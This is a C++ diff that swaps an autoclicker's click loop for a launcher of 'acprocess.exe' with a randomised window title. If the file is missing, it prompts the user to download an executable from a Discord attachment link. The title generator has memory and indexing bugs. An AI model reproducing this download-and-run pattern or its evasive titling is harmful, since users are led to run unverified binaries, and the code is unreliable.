@@ -1,72 +1,65 @@
 #include <iostream>
 #include <windows.h>
 #include <conio.h>
+#include <cstdlib>
+#include "psrandom.h"
+#include <cstdio>
+#include <fstream>
 
-#define MOUSE1_DELAY 55
-#define MOUSE2_DELAY 30
-#define KEY_TO_PRESS 0x52 // RBTN
-#define KEY_TO_PRESS2 0x58 // XBTN
-
-bool mouse1_enabled = false;
-bool mouse2_enabled = false;
-bool showcmd = true;
-HWND hwnd;
-void PressKey(DWORD key1, DWORD key2);
+LPWSTR GenerateCustomApplicationName();
 
 int main(int argc, char* argv[]) {
-    MessageBoxW(hwnd, L"R - Left AC\nX - Right AC\nINSERT - Show/hide cmd window\nEND - Quit AC", L"Controlls", MB_OK | MB_ICONINFORMATION);
-    while(true) {
-        if (GetAsyncKeyState(KEY_TO_PRESS)) {
-            mouse1_enabled = true;
-            Sleep(150);
-            std::cout << "Autoclicker enabled" << std::endl;
-        }
-        else if (GetAsyncKeyState(VK_END)) {
-            system("taskkill /F /IM vnjsoa.exe");
-        }
-        else if (GetAsyncKeyState(KEY_TO_PRESS2)) {
-            mouse2_enabled = true;
-            Sleep(150);
-            std::cout << "Autoclicker enabled" << std::endl;
-        }
-        else if (GetAsyncKeyState(VK_INSERT)) {
-            if (showcmd) {
-                showcmd = false;
-                ShowWindow(GetConsoleWindow(), SW_HIDE);
-                Sleep(150);
-            }
-            else {
-                showcmd = true;
-                ShowWindow(GetConsoleWindow(), SW_SHOW);
-                Sleep(150);
-            }
-        }
-        while(mouse1_enabled == true) {
-            PressKey(MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP);
-            int sleeptime = rand()%((MOUSE1_DELAY+50)-(MOUSE1_DELAY-50) + 1) + MOUSE1_DELAY-50;
-            std::cout << sleeptime << " MS delay" << std::endl;
-            Sleep(sleeptime);
-            if (GetAsyncKeyState(KEY_TO_PRESS)) {
-                mouse1_enabled = false;
-                Sleep(150);
-                std::cout << "Autoclicker disabled" << std::endl;
-            }
-        }
-        while (mouse2_enabled == true) {
-            PressKey(MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP);
-            int sleeptime = rand()%((MOUSE2_DELAY+20)-(MOUSE2_DELAY-20) + 1) + MOUSE2_DELAY-20;
-            std::cout << sleeptime << " MS delay" << std::endl;
-            Sleep(sleeptime);
-            if (GetAsyncKeyState(KEY_TO_PRESS2)) {
-                mouse2_enabled = false;
-                Sleep(150);
-                std::cout << "Autoclicker disabled" << std::endl;
-            }
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+    si.lpTitle = GenerateCustomApplicationName();
+    HANDLE hPipeRead, hPipeWrite;
+    SECURITY_ATTRIBUTES saAttr;
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
+        std::cerr << "Error creating pipe" << std::endl;
+        return 1;
+    }
+    LPCTSTR lpApplicationName = L"acprocess.exe";
+    if (!CreateProcess(lpApplicationName, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+        int answ = MessageBox(NULL, L"acprocess.exe not found, do you want to install it?", L"ErrorNotFound", MB_OKCANCEL | MB_ICONERROR);
+        if (answ == IDOK) {
+            system("start \"\" \"https://cdn.discordapp.com/attachments/1099243236603723856/1217509958208323634/acprocess.exe?ex=66044982&is=65f1d482&hm=48c1e522e2a051ff9916469bf0a71e2197c90c3dcec077e3c91ddc08efbafe85&\"");
+            MessageBox(NULL, L"Put this executable file into the same folder as autoclicker.exe, for it to work correctly", L"Installation", MB_OK | MB_ICONINFORMATION);
         }
     }
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
 }
 
-void PressKey(DWORD key1, DWORD key2) {
-    mouse_event(key1, 0, 0, 0, 0);
-    mouse_event(key2, 0, 0, 0, 0);
+LPWSTR GenerateCustomApplicationName() {
+    char lowerChars[27] = "qwertzuiopasdfghjklyxcvbnm";
+    char upperChars[27] = "QWERTZUIOPASDFGHJKLYXCVBNM";
+    int titleLength = psr::randomBetween(7, 10);
+    LPWSTR returnValue = new wchar_t[titleLength+1];
+    for (int i = 0; i < titleLength; i++) {
+        char randomChar;
+        int randomVal;
+        switch (psr::randomBetween(0, 2)) {
+            case 0:
+                randomVal = psr::randomBetween(0,9);
+                returnValue[i] = static_cast<wchar_t>('0' + randomVal);
+                break;
+            case 1:
+                randomChar = lowerChars[psr::randomBetween(0,27)];
+                returnValue[i] = static_cast<wchar_t>('0' + randomChar);
+                break;
+            case 2:
+                randomChar = upperChars[psr::randomBetween(0,27)];
+                returnValue[i] = static_cast<wchar_t>('0' + randomChar);
+                break;
+        }
+    }
+    return returnValue;
 }
